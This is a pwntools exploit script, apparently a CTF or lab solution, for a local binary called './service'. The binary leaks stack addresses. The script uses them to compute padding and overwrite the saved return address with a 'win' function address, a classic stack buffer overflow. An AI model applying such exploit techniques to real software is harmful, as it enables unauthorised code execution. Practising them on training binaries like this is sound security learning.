#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./service
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./service')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

r = start()

r.recvuntil(b"Current Return Address: ")
rip_savd = int(r.recvline().decode(), 16)

r.recvuntil(b"the base pointer: ")
rbp = int(r.recvline().decode(), 16)

r.recvuntil(b"will be stored: ")
buffer = int(r.recvline().decode(), 16)

rip = rbp + 8

padding = rbp - buffer + 8

print(padding)

win_addr = rip_savd - 0x17e9 + 0x151a

payload = b"a"*padding + struct.pack("<Q", win_addr)

r.sendline(payload)

r.interactive()

